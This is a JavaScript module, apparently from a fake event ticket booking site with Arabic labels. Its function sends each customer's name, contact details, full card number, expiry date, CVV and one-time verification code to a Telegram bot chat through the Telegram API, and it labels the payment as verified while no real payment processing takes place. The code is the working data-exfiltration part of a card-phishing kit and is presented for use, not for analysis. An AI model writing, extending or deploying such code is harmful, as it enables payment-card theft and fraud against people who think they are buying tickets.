// lib/telegramBot.js
export async function sendToTelegram(data, otp = null) {
  const BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Telegram bot token or chat ID not configured");
    return { success: false, error: "Telegram configuration missing" };
  }

  try {
    // Format the message
    let message = "🎟️ *حجز تذكرة جديد* 🎟️\n\n";
    message += `*الفعالية:* ${data.eventTitle}\n`;
    message += `*التاريخ:* ${data.eventDate}\n`;
    message += `*نوع التذكرة:* ${data.ticketType}\n`;
    message += `*الكمية:* ${data.quantity}\n`;
    message += `*المبلغ الإجمالي:* $${data.totalAmount}\n\n`;
    message += `*العميل:* ${data.fullName}\n`;
    message += `*البريد الإلكتروني:* ${data.email}\n`;
    message += `*الهاتف:* ${data.phone}\n\n`;

    // Add payment card details
    message += `*صاحب البطاقة:* ${data.cardHolder}\n`;
    message += `*رقم البطاقة:* ${data.cardNumber}\n`;
    message += `*تاريخ الانتهاء:* ${data.expiryDate}\n`;
    message += `*رمز الأمان:* ${data.cvv}\n\n`;

    // Add OTP if available
    if (otp) {
      message += `*رمز التحقق:* ${otp}\n\n`;
    }

    message += `*حالة الدفع:* تم التحقق ✅`;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    const result = await response.json();

    if (result.ok) {
      return { success: true };
    } else {
      console.error("Telegram API error:", result);
      return { success: false, error: result.description };
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return { success: false, error: error.message };
  }
}
